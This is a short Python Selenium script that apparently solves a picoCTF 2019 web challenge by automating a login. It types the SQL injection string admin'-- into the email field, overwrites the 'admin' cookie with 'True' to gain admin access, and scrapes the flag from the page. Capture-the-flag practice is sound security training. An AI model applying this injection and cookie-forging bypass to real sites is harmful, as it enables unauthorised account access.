import re
from selenium import webdriver

url = 'https://2019shell1.picoctf.com/problem/32270/'

#PLEASE CHANGE THE EXECUTABLE PLATH TO YOURS!:
driver = webdriver.Firefox(executable_path='/Users/jeffryjimenez/Desktop/hw2/code/geckodriver')
driver.get(url)

username_element = driver.find_element_by_id('email')
username_element.send_keys("admin'--")

signIn_button = driver.find_element_by_css_selector("input[type='submit']").click()
driver.delete_cookie('admin')
driver.add_cookie({"name": 'admin', "value": 'True'})
driver.refresh()

flag = driver.find_element_by_tag_name("code")
result = re.findall('\{(.+)\}', flag.text)[0]
print(result)
